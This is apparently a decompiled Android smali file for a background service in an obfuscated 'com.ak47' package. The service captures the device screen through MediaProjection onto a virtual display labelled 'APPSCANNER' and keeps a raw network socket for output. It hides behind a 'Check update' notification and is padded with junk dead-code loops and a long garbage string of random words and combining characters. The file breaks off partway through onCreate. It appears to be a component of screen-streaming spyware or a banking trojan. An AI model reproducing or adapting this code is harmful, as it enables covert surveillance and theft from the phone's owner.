.class public Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;
.super Landroid/app/Service;
.source ""


# static fields
.field public static k:Ljava/net/Socket;

.field public static l:Ljava/io/OutputStream;

.field private static m:Landroid/media/projection/MediaProjection;

.field private static n:Landroid/hardware/display/VirtualDisplay;

.field public static o:I

.field public static p:I

.field public static q:Ljava/lang/String;

.field public static r:Z

.field public static s:Z

.field public static t:Z


# instance fields
.field private final a:Landroid/os/HandlerThread;

.field private b:Landroid/os/Handler;

.field private c:Landroid/media/projection/MediaProjectionManager;

.field private d:Landroid/view/WindowManager;

.field private e:Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;

.field private f:I

.field private g:Landroid/content/Intent;

.field h:Landroid/app/Notification;

.field i:I

.field j:I


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Landroid/os/HandlerThread;

    const-class v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/4 v2, -0x4

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->a:Landroid/os/HandlerThread;

    const/16 v0, 0x1a14

    iput v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->i:I

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->j:I

    return-void
.end method

.method static synthetic b(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->j(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic c(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;)V
    .locals 0

    invoke-direct {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->f()V

    return-void
.end method

.method static synthetic d()Landroid/hardware/display/VirtualDisplay;
    .locals 1

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->n:Landroid/hardware/display/VirtualDisplay;

    return-object v0
.end method

.method public static e(Landroid/content/Context;I)V
    .locals 1

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/NotificationManager;

    invoke-virtual {p0, p1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method

.method private f()V
    .locals 2

    :try_start_0
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :try_start_2
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    goto :goto_4

    :catch_2
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_0
    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_1
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_2
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :catch_3
    :cond_3
    :goto_4
    :try_start_3
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    :catch_4
    :try_start_4
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_5

    goto :goto_5

    :catch_5
    nop

    :goto_5
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->l:Ljava/io/OutputStream;

    if-eqz v0, :cond_4

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_6
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_6

    :catch_6
    const/4 v0, 0x0

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->l:Ljava/io/OutputStream;

    :cond_4
    return-void
.end method

.method private j(Landroid/content/Context;)V
    .locals 9

    const-string p1, "1080"

    const-string v0, "720"

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->c:Landroid/media/projection/MediaProjectionManager;

    iget v2, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->f:I

    iget-object v3, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->g:Landroid/content/Intent;

    invoke-virtual {v1, v2, v3}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v1

    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->m:Landroid/media/projection/MediaProjection;

    :try_start_0
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "SCH"

    invoke-static {v1, v2, v0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/e;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "SCW"

    invoke-static {v1, v2, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/e;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_0

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_0
    :goto_1
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_1

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_1
    :goto_2
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_2

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_2
    :goto_3
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_3

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_3
    :goto_4
    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;

    invoke-direct {v1, p0, v0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;Ljava/lang/String;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->e:Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;

    new-instance p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27$c;

    invoke-direct {p1, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27$c;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;)V

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->m:Landroid/media/projection/MediaProjection;

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->e:Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;

    invoke-virtual {v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;->e()I

    move-result v2

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->e:Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;

    invoke-virtual {v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;->c()I

    move-result v3

    invoke-virtual {p0}, Landroid/app/Service;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v1

    iget v4, v1, Landroid/util/DisplayMetrics;->densityDpi:I

    const/16 v5, 0x10

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->e:Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;

    invoke-virtual {v1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/a;->d()Landroid/view/Surface;

    move-result-object v6

    const/4 v7, 0x0

    iget-object v8, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->b:Landroid/os/Handler;

    const-string v1, "APPSCANNER"

    invoke-virtual/range {v0 .. v8}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v0

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->n:Landroid/hardware/display/VirtualDisplay;

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->m:Landroid/media/projection/MediaProjection;

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->b:Landroid/os/Handler;

    invoke-virtual {v0, p1, v1}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method public static k()V
    .locals 2

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->m:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_3

    :try_start_0
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->n:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->m:Landroid/media/projection/MediaProjection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_0
    :goto_1
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_1
    :goto_2
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_2
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_3
    :goto_4
    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27$b;

    invoke-direct {v1, p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27$b;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method g()Landroid/os/Handler;
    .locals 1

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->b:Landroid/os/Handler;

    return-object v0
.end method

.method h()Landroid/view/WindowManager;
    .locals 1

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->d:Landroid/view/WindowManager;

    return-object v0
.end method

.method public i()V
    .locals 2

    iget v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->j:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->j:I

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27$a;

    invoke-direct {v1, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27$a;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 8

    const-string v0, "Check update"

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    :try_start_0
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    if-nez v2, :cond_0

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sput-object v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    :cond_0
    iget-object v2, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27;->h:Landroid/app/Notification;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    if-nez v2, :cond_9

    const/4 v2, 0x0

    const/4 v3, 0x0

    :try_start_1
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1a

    if-lt v4, v5, :cond_5

    const-class v4, Landroid/app/NotificationManager;

    invoke-virtual {v1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/NotificationManager;

    if-eqz v4, :cond_1

    invoke-virtual {v4, v0}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v5

    if-nez v5, :cond_1

    new-instance v5, Landroid/app/NotificationChannel;

    const-string v6, "offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058"

    const-string v7, ""

    invoke-virtual {v0, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x3

